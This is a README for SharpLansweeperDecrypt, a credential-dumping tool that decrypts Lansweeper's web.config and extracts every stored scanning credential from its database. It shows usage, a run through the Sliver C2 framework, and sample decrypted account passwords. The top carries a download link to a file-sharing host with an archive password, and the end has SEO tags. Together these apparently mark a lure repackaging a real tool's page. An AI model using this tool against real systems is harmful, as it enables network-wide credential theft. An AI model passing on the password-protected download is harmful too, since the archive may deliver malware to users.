# SharpLansweeperDecrypt

# [DOWNLOAD](https://www.4sync.com/web/directDownload/vQ0GwKNh/ucR3VkWM.b319ff3cba0a42c5ae3faf25e462a580)  
## PASSWORD: g1tsoft2025


![image](https://github.com/user-attachments/assets/437c787f-0f20-4001-aea3-aad05a4b91ab)


`SharpLansweeperDecrypt` is designed to automatically extract and decrypt all configured scanning credentials of a  instance, provided there is local access to the server.

For manual decryption, the tool is capable of decrypting passwords when supplied with both the encrypted password and the encryption key (`C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`).


1. Automatically identifies and decrypts the database connection strings contained within Lansweeper's `web.config` file.
2. Utilizes the decrypted connection strings to query the Lansweeper SQL database, retrieving all configured `Scanning Credentials`.
3. Locates the `Encryption.txt` file on the disk, which Lansweeper uses for credential encryption.
4. Applies the encryption key to decrypt and display the scanning credentials.

## Usage
```
PS C:\Users\Yeeb\Downloads> .\SharpLansweeperDecrypt.exe -h
╔═╗┬ ┬┌─┐┬─┐┌─┐╦  ┌─┐┌┐┌┌─┐┬ ┬┌─┐┌─┐┌─┐┌─┐┬─┐╔╦╗┌─┐┌─┐┬─┐┬ ┬┌─┐┌┬┐
╚═╗├─┤├─┤├┬┘├─┘║  ├─┤│││└─┐│││├┤ ├┤ ├─┘├┤ ├┬┘ ║║├┤ │  ├┬┘└┬┘├─┘ │
╚═╝┴ ┴┴ ┴┴└─┴  ╩═╝┴ ┴┘└┘└─┘└┴┘└─┘└─┘┴  └─┘┴└─═╩╝└─┘└─┘┴└─ ┴ ┴   ┴

Usage:
  No arguments: Runs the program as is, decrypting web.config and connecting to the SQL database.
  -p <path>: Optional path to the encryption key. If not provided, a default path is used.
  -e <encryptedPassword>: Decrypts the provided encrypted password without decrypting web.config or connecting to the SQL database.
```
![image](https://github.com/user-attachments/assets/be6e68d6-8d5d-4e85-ba51-681609b97227)

### Automatic Decryption

With no arguments specified the tool will try to automatically dump and decrypt all configured `Scanning Credentials`

```
sliver (maldev) > inline-execute-assembly tool/SharpLansweeperDecrypt.exe -

[*] Successfully executed inline-execute-assembly (coff-loader)
[*] Got output:
[+] Success - Wrote 12298 bytes to memory

╔═╗┬ ┬┌─┐┬─┐┌─┐╦  ┌─┐┌┐┌┌─┐┬ ┬┌─┐┌─┐┌─┐┌─┐┬─┐╔╦╗┌─┐┌─┐┬─┐┬ ┬┌─┐┌┬┐
╚═╗├─┤├─┤├┬┘├─┘║  ├─┤│││└─┐│││├┤ ├┤ ├─┘├┤ ├┬┘ ║║├┤ │  ├┬┘└┬┘├─┘ │
╚═╝┴ ┴┴ ┴┴└─┴  ╩═╝┴ ┴┘└┘└─┘└┴┘└─┘└─┘┴  └─┘┴└─═╩╝└─┘└─┘┴└─ ┴ ┴   ┴

[+] Loading web.config file...
[+] Decrypted connectionStrings section:
Using connectionString: Data Source=(localdb)\.\LSInstance;Initial Catalog=lansweeperdb;Integrated Security=False;User ID=lansweeperuser;Password=InfiniteVoid*GetoSuguru;Connect Timeout=10;Application Name="LsService Core .Net SqlClient Data Provider"
[+] Opening connection to the database...
[+] Retrieving credentials from the database...
[+] Credential decrypted successully
┌───────────────────────────────────────┐
│ Credential: SNMP-Private              │
│ Username:   SNMP Community String     │
│ Password:   private                   │
└───────────────────────────────────────┘
[+] Credential decrypted successully
┌───────────────────────────────────────┐
│ Credential: Global SNMP               │
│ Username:                             │
│ Password:   public                    │
└───────────────────────────────────────┘
[+] Credential decrypted successully
┌───────────────────────────────────────┐
│ Credential: Inventory Windows         │
│ Username:   SWEEP\svc_inventory_win   │
│ Password:   CursedEnergy$Itadori$     │
└───────────────────────────────────────┘
[+] Credential decrypted successully
┌───────────────────────────────────────┐
│ Credential: Inventory Linux           │
│ Username:   svc_inventory_lnx         │
│ Password:   CurseExorcist#Gojo!       │
└───────────────────────────────────────┘
[+] Database connection closed.

[+] inlineExecute-Assembly Finished
```
### Manual Decryption
Sould the `web.config` file be undecryptable or access to the SQL service be unavailable, `SharpLansweeperDecrypt` offers a manual decryption option using the `-e` flag. In cases where the encryption key's path is not explicitly provided with the `-p` flag, the tool defaults to using `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`.

```PS C:\Users\Yeeb\Downloads> .\SharpLansweeperDecrypt.exe -e 'fuVE63qSVMPbuSnYUdUE+MuRpn8t/PXyLnMUb4gfDew='
╔═╗┬ ┬┌─┐┬─┐┌─┐╦  ┌─┐┌┐┌┌─┐┬ ┬┌─┐┌─┐┌─┐┌─┐┬─┐╔╦╗┌─┐┌─┐┬─┐┬ ┬┌─┐┌┬┐
╚═╗├─┤├─┤├┬┘├─┘║  ├─┤│││└─┐│││├┤ ├┤ ├─┘├┤ ├┬┘ ║║├┤ │  ├┬┘└┬┘├─┘ │
╚═╝┴ ┴┴ ┴┴└─┴  ╩═╝┴ ┴┘└┘└─┘└┴┘└─┘└─┘┴  └─┘┴└─═╩╝└─┘└─┘┴└─ ┴ ┴   ┴


```

### Powershell
In addition to the C# version, this repository also includes a PowerShell script, `LansweeperDecrypt.ps1`, which automates the process of dumping and decrypting Lansweeper credentials. 

## Compilation
Ensure your C# development environment (e.g., .NET SDK, Visual Studio) is set up correctly. The project requires the `System.Configuration.ConfigurationManager`.

```sh
dotnet add package System.Configuration.ConfigurationManager
```

Alternatively, if you're using Visual Studio, you can manage NuGet packages for your project and add `System.Configuration.ConfigurationManager` from there.

## Acknowledgments

Special thanks to the  repository for providing guidance on how to decrypt Lansweeper Scanning Credentials.

---

*The script is for informational and educational purposes only. The author and contributors of this script are not responsible for any misuse or damage caused by this tool.* <!-- meme -->


###TAGS
-lansweeper
-photo
-all
-seo
-sharp
